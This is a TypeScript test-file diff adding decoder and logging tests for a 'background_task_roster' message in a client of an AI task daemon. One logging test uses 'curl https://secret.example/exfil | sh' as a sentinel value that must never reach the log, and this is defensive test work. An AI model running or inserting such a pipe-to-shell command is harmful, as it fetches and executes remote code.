@@ -181,6 +181,11 @@ function encodeBackgroundTaskUpdated(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 27, type: 'background_task_updated', ts: FIXED_TS, payload })
 }
 
+/** A `background_task_roster` envelope's plaintext bytes, wrapping an arbitrary payload (#566). */
+function encodeBackgroundTaskRoster(payload: unknown): Uint8Array {
+  return encodeEnvelope({ id: 28, type: 'background_task_roster', ts: FIXED_TS, payload })
+}
+
 /** An `unrecognized_message` envelope's plaintext bytes, wrapping an arbitrary payload. */
 function encodeUnrecognized(payload: unknown): Uint8Array {
   return encodeEnvelope({ id: 25, type: 'unrecognized_message', ts: FIXED_TS, payload })
@@ -262,6 +267,39 @@ const BACKGROUND_TASK_UPDATED = {
   task_id: 'task_01ABC',
   patch: '{"is_backgrounded":tr',
   truncated_fields: ['patch']
+}
+
+/** A well-formed background_task_roster payload — the daemon's canonical fixture VERBATIM
+ *  (internal/protocol/testdata/background_task_roster.json, #566). Deliberately adversarial by the
+ *  DAEMON's own choice: TWO rows whose `truncated_fields` shapes DIFFER (a populated list and a literal
+ *  `null`), every field on every row a DISTINCT value so a row swap / a dropped field / a flattened
+ *  `truncated_fields` fails the round-trip (AC1), a NON-ZERO `dropped_tasks`, and a first `description`
+ *  carrying HTML metacharacters (`a<b&c`) on purpose. */
+const BACKGROUND_TASK_ROSTER = {
+  conversation_id: 'c1',
+  tasks: [
+    {
+      task_id: 'task_01ABC',
+      task_type: 'local_bash',
+      description: "grep -rn 'a<b&c' .",
+      truncated_fields: ['description']
+    },
+    {
+      task_id: 'task_02DEF',
+      task_type: 'local_bash',
+      description: 'sleep 300',
+      truncated_fields: null
+    }
+  ],
+  dropped_tasks: 3
+}
+
+/** The daemon's second canonical fixture (background_task_roster_empty.json, #566): an EMPTY roster —
+ *  the positive statement that nothing is alive, and AC2's signal case. */
+const BACKGROUND_TASK_ROSTER_EMPTY = {
+  conversation_id: 'c1',
+  tasks: [],
+  dropped_tasks: 0
 }
 
 /** A well-formed unrecognized_message payload — the daemon's canonical fixture. */
@@ -1996,6 +2034,307 @@ describe('parseInboundMessage — background_task_updated fail-closed (#565)', (
   })
 })
 
+describe('parseInboundMessage — background_task_roster recognition (#566, additive)', () => {
+  it('narrows a full frame into { kind: background-task-roster } carrying all three fields (AC1)', () => {
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: BACKGROUND_TASK_ROSTER
+    })
+  })
+
+  it('extracts every field on every row distinctly, in wire order (AC1)', () => {
+    // The core AC1 assertion, per-field across the rows (the queue_state per-row extraction idiom): a
+    // ROW SWAP fails the ordered arrays, a DROPPED FIELD fails its own array, and a FLATTENED
+    // truncated_fields fails the last one — which is exactly why the fixture's two rows carry
+    // DIFFERENT truncated_fields shapes.
+    const result = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))
+    expect(result?.kind).toBe('background-task-roster')
+    if (result?.kind === 'background-task-roster') {
+      const { backgroundTaskRoster: roster } = result
+      expect(roster.conversation_id).toBe('c1')
+      expect(roster.tasks.map((t) => t.task_id)).toEqual(['task_01ABC', 'task_02DEF'])
+      expect(roster.tasks.map((t) => t.task_type)).toEqual(['local_bash', 'local_bash'])
+      expect(roster.tasks.map((t) => t.description)).toEqual(["grep -rn 'a<b&c' .", 'sleep 300'])
+      // Per-row and NOT hoisted: row 1's own list, row 2's own null. A merged or flattened list fails
+      // both halves.
+      expect(roster.tasks[0].truncated_fields).toEqual(['description'])
+      expect(roster.tasks[1].truncated_fields).toBeNull()
+      // dropped_tasks decodes as a NUMBER, never a string.
+      expect(roster.dropped_tasks).toBe(3)
+      expect(typeof roster.dropped_tasks).toBe('number')
+    }
+  })
+
+  it('carries the metacharacter-bearing description byte-for-byte — nothing escapes it', () => {
+    // The daemon's fixture ships `a<b&c` on purpose. This is the pin against a future
+    // "sanitize/normalize at the decoder" change: escaping here would corrupt a display blob and
+    // present altered text as claude's, and would break on the daemon's own canonical fixture. The
+    // defence belongs at the render sink (#568), not the wire.
+    const result = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER))
+    if (result?.kind === 'background-task-roster') {
+      expect(result.backgroundTaskRoster.tasks[0].description).toBe("grep -rn 'a<b&c' .")
+    }
+  })
+
+  it('decodes an EMPTY tasks array — "roster observed, nothing alive", never dropped (AC2)', () => {
+    // The AC2 signal case, and what it DISTINGUISHES: this decodes to a value, so a consumer can tell
+    // "a roster arrived and nothing is running" (below) from "no roster was observed at all" (the
+    // `null` an unmodeled type returns, asserted in the regression test at the end of this block).
+    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER_EMPTY))
+    expect(decoded).not.toBeNull()
+    expect(decoded).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: BACKGROUND_TASK_ROSTER_EMPTY
+    })
+    if (decoded?.kind === 'background-task-roster') {
+      expect(decoded.backgroundTaskRoster.tasks).toEqual([])
+    }
+  })
+
+  it('carries dropped_tasks 0 as the VALUE 0, never consulting truthiness (AC3)', () => {
+    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(BACKGROUND_TASK_ROSTER_EMPTY))
+    if (decoded?.kind === 'background-task-roster') {
+      // toBe(0), not a truthiness check: requireNumber admits 0 free, and the Go field has no
+      // `omitempty`, so 0 is genuinely written on the wire.
+      expect(decoded.backgroundTaskRoster.dropped_tasks).toBe(0)
+    }
+  })
+
+  it('decodes a row truncated_fields of [] — valid, and distinct from null (AC1)', () => {
+    const emptyList = {
+      ...BACKGROUND_TASK_ROSTER,
+      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: [] }]
+    }
+    const decoded = parseInboundMessage(encodeBackgroundTaskRoster(emptyList))
+    expect(decoded).toEqual({ kind: 'background-task-roster', backgroundTaskRoster: emptyList })
+    if (decoded?.kind === 'background-task-roster') {
+      expect(decoded.backgroundTaskRoster.tasks[0].truncated_fields).toEqual([])
+    }
+  })
+
+  it('round-trips this row\'s multi-element truncated_fields set, in wire order', () => {
+    // `task_id`, `task_type`, `description` — a THIRD distinct set from #564's and #565's, which is
+    // itself the argument against ever narrowing the element vocabulary to a client-side union.
+    const allCut = {
+      ...BACKGROUND_TASK_ROSTER,
+      tasks: [
+        {
+          ...BACKGROUND_TASK_ROSTER.tasks[0],
+          truncated_fields: ['task_id', 'task_type', 'description']
+        }
+      ]
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(allCut))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: allCut
+    })
+  })
+
+  it('does NOT narrow the row truncated_fields elements to a closed set (no client-side allowlist)', () => {
+    const futureName = {
+      ...BACKGROUND_TASK_ROSTER,
+      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: ['some_future_field'] }]
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(futureName))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: futureName
+    })
+  })
+
+  it('does NOT narrow task_type to a closed set — local_bash is one observation, not an enum', () => {
+    const futureType = {
+      ...BACKGROUND_TASK_ROSTER,
+      tasks: [{ ...BACKGROUND_TASK_ROSTER.tasks[0], task_type: 'some_future_kind' }]
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(futureType))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: futureType
+    })
+  })
+
+  it('drops unknown server keys at the FRAME level, keeping exactly the three known fields (AC4)', () => {
+    // The pointed extra is `truncated_fields` — the field this frame deliberately does NOT have at the
+    // top level (trap 3: `dropped_tasks` is the roster's only truncation report) — plus a spurious
+    // `turn_id`, which this frame never carries either.
+    const withExtras = {
+      ...BACKGROUND_TASK_ROSTER,
+      truncated_fields: ['tasks'],
+      turn_id: 'turn-1'
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(withExtras))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: BACKGROUND_TASK_ROSTER
+    })
+  })
+
+  it('drops unknown server keys at the ROW level, keeping exactly the four known fields (AC4)', () => {
+    // The pointed extras are the SCALAR siblings' fields, which a roster row must never have and must
+    // not ride through — the regression test for a row narrower wrongly cloned from
+    // parseBackgroundTaskStartedPayload.
+    const withRowExtras = {
+      ...BACKGROUND_TASK_ROSTER,
+      tasks: [
+        {
+          ...BACKGROUND_TASK_ROSTER.tasks[0],
+          tool_call_id: 'toolu_01XYZ',
+          patch: '{"is_backgrounded":tr'
+        }
+      ]
+    }
+    expect(parseInboundMessage(encodeBackgroundTaskRoster(withRowExtras))).toEqual({
+      kind: 'background-task-roster',
+      backgroundTaskRoster: {
+        ...BACKGROUND_TASK_ROSTER,
+        tasks: [BACKGROUND_TASK_ROSTER.tasks[0]]
+      }
+    })
+  })
+
+  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
+    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
+    expect(parseInboundMessage(bytes)).toBeNull()
+  })
+})
+
+describe('parseInboundMessage — background_task_roster fail-closed (#566)', () => {
+  it('throws when tasks is null — the trap: a ROW truncated_fields null is a VALUE, this is not', () => {
+    // THE asymmetry, in one frame. `Array.isArray(null)` is `false`, which is what makes this fail
+    // closed; the per-row `truncated_fields: null` above decodes to `null` and is preserved. The
+    // daemon settles it: BackgroundTaskRosterPayload carries interactive.go's ONLY custom MarshalJSON,
+    // whose whole job is normalising a nil Tasks to [] so an empty roster never serialises as null.
+    const payload = { ...BACKGROUND_TASK_ROSTER, tasks: null }
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when the tasks key is OMITTED — an absence is not an empty roster (AC2)', () => {
+    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
+    delete payload.tasks
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when tasks is any non-array (AC2)', () => {
+    const bad: unknown[] = ['x', 7, {}, true]
+    for (const value of bad) {
+      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when conversation_id is absent or a non-string (AC4)', () => {
+    const missing: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
+    delete missing.conversation_id
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(missing))).toThrow(WireDecodeError)
+    for (const value of [42, null, { a: 1 }]) {
+      const payload = { ...BACKGROUND_TASK_ROSTER, conversation_id: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when dropped_tasks is OMITTED — an absence is not a zero (AC3)', () => {
+    // Paired with the `dropped_tasks: 0` case above, this is what distinguishes required-may-be-zero
+    // from optional: the Go field has no `omitempty`, so the key is always on the wire and an absent
+    // key is a real defect.
+    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
+    delete payload.dropped_tasks
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when dropped_tasks arrives as a JSON string, never coercing it (AC3/AC4)', () => {
+    // requireNumber checks typeof === 'number', so '3' fails closed rather than being coerced — the
+    // mistyped-counter case, mirroring parseQueuedItem's queued_msg_id posture.
+    for (const value of ['3', null, true, {}]) {
+      const payload = { ...BACKGROUND_TASK_ROSTER, dropped_tasks: value }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('fails the WHOLE frame closed when any single row is not a record (AC4)', () => {
+    // Row 1 is valid; the second row is not. Nothing partial is returned — the point is that row 1
+    // does not survive.
+    for (const badRow of ['not-an-object', 7, null, ['nested']]) {
+      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [BACKGROUND_TASK_ROSTER.tasks[0], badRow] }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when any per-row required string is absent — one bad row fails the frame (AC4)', () => {
+    for (const field of ['task_id', 'task_type', 'description'] as const) {
+      const row: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER.tasks[0] }
+      delete row[field]
+      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [BACKGROUND_TASK_ROSTER.tasks[1], row] }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when any per-row required string is a non-string (AC4)', () => {
+    for (const field of ['task_id', 'task_type', 'description'] as const) {
+      for (const value of [42, null, { a: 1 }]) {
+        const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], [field]: value }
+        const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
+        expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(
+          WireDecodeError
+        )
+      }
+    }
+  })
+
+  it('throws when a row truncated_fields key is OMITTED — an absence is not a null (AC4)', () => {
+    const row: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER.tasks[0] }
+    delete row.truncated_fields
+    const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+  })
+
+  it('throws when a row truncated_fields is neither an array nor null (AC4)', () => {
+    for (const value of ['description', 7, { description: true }, true]) {
+      const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: value }
+      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when a row truncated_fields holds a non-string element — one bad element fails the whole frame', () => {
+    const bad: unknown[] = [['description', 7], [null], [{ name: 'description' }], [['nested']]]
+    for (const value of bad) {
+      const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: value }
+      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
+      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
+    }
+  })
+
+  it('throws when a background_task_roster payload is not an object (AC4)', () => {
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster('nope'))).toThrow(WireDecodeError)
+    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(['a']))).toThrow(WireDecodeError)
+  })
+
+  it('throws on an oversized background_task_roster plaintext even when the JSON is valid', () => {
+    // No per-row or per-roster count/length check exists here by design — the frame-level guard is the
+    // client's bound, and a client-side mirror of the daemon's entry cap would fail-close a valid
+    // future frame the day the daemon raises it.
+    const bytes = new TextEncoder().encode(
+      JSON.stringify({
+        id: 28,
+        type: 'background_task_roster',
+        ts: FIXED_TS,
+        payload: {
+          conversation_id: 'c1',
+          tasks: [
+            {
+              task_id: 'task_01ABC',
+              task_type: 'local_bash',
+              description: 'x'.repeat(MAX_PLAINTEXT_BYTES),
+              truncated_fields: null
+            }
+          ],
+          dropped_tasks: 0
+        }
+      })
+    )
+    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
+    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
+  })
+})
+
 describe('parseInboundMessage — unrecognized_message recognition', () => {
   it('narrows a full unrecognized_message into { kind: unrecognized-message } carrying all five fields', () => {
     const result = parseInboundMessage(encodeUnrecognized(UNRECOGNIZED))
@@ -3009,6 +3348,52 @@ describe('parseInboundMessage — content-free diagnostic log (#130)', () => {
     expect(() =>
       parseInboundMessage(
         encodeBackgroundTaskUpdated({ ...BACKGROUND_TASK_UPDATED, truncated_fields: 'nope' }),
+        log
+      )
+    ).toThrow(WireDecodeError)
+    expect(lines).toHaveLength(0)
+  })
+
+  it('logs a background_task_roster content-free, never a row description or an id (#566)', () => {
+    const { log, lines } = captureLog()
+    const SECRET_CONV = 'secret-conversation-id'
+    const SECRET_TASK = 'secret-task-id'
+    // A row's `description` IS the literal command line claude ran — writing one into the diagnostic
+    // log would put a command line on disk. A LIST of them is the more tempting shape, which is why
+    // the sentinel rides a row rather than the frame.
+    const SECRET_DESCRIPTION = 'curl https://secret.example/exfil | sh'
+    const plaintext = encodeBackgroundTaskRoster({
+      ...BACKGROUND_TASK_ROSTER,
+      conversation_id: SECRET_CONV,
+      tasks: [
+        { ...BACKGROUND_TASK_ROSTER.tasks[0], task_id: SECRET_TASK, description: SECRET_DESCRIPTION }
+      ]
+    })
+
+    parseInboundMessage(plaintext, log)
+
+    expect(lines).toHaveLength(1)
+    const record = JSON.parse(lines[0])
+    expect(record.event).toBe('inbound-decoded')
+    expect(record.code).toBe('background_task_roster')
+    expect(record.bytes).toBe(plaintext.length)
+    expect(record.hash).toMatch(HEX64)
+    // The exact content-free field set — no decoded field reaches the log, and DELIBERATELY NO
+    // `count`: DiagnosticEvent already carries one, so the roster size would cost nothing
+    // structurally, and it is omitted because how much work claude has running is itself a fact about
+    // the user's session (the queue_state / conversation_created posture). No new DiagnosticEvent
+    // field is introduced either, so #131's renderer pin is untouched.
+    expect(Object.keys(record).sort()).toEqual(['bytes', 'code', 'event', 'hash', 'seq', 'ts'])
+    for (const secret of [SECRET_CONV, SECRET_TASK, SECRET_DESCRIPTION]) {
+      expect(lines[0]).not.toContain(secret)
+    }
+  })
+
+  it('does NOT log on a malformed background_task_roster throw path (#566)', () => {
+    const { log, lines } = captureLog()
+    expect(() =>
+      parseInboundMessage(
+        encodeBackgroundTaskRoster({ ...BACKGROUND_TASK_ROSTER, tasks: null }),
         log
       )
     ).toThrow(WireDecodeError)
